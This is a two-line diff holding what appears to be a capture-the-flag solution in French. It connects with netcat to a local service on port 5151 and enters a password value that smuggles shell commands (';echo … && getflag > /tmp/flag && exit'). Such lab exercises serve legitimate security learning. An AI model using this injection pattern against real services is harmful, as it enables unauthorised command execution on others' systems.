@@ -1,0 +1,2 @@
+nc localhost 5151
+Password: -n ;echo f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 && getflag > /tmp/flag && exit  ||| On a que besoin du getflag et exit, menfin bon
